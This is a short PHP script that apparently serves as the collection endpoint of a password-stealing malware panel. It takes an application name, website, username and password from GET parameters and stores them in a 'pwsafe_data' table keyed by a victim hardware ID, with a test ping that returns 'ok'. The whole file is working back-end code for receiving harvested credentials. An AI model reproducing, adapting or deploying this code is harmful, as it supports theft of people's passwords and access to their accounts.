<?php
@include_once('../../includes/all.inc');

if (isset($_GET['pwsafe_app']) && isset($_GET['pwsafe_website']) && isset($_GET['pwsafe_user']) && isset($_GET['pwsafe_pass']))
{
	if (isset($_GET['pwsafe_test']))
		die('ok');
	$stmt = db_query("SELECT `id` FROM `pwsafe_data` WHERE `hwid` = :1 AND `website` = :2 AND `user` = :3 AND `pass` = :4",
						htmlentities($_GET['hwid']),
						htmlentities($_GET['pwsafe_website']),
						htmlentities($_GET['pwsafe_user']),
						htmlentities($_GET['pwsafe_pass']));
	if ($stmt->rowCount() == 0)
	{
		db_query("INSERT INTO `pwsafe_data`(`hwid`, `app`, `website`, `user`, `pass`) VALUES(:1, :2, :3, :4, :5)",
						htmlentities($_GET['hwid']),
						htmlentities($_GET['pwsafe_app']),
						htmlentities($_GET['pwsafe_website']),
						htmlentities($_GET['pwsafe_user']),
						htmlentities($_GET['pwsafe_pass']));
	}	
	die('');
}

?>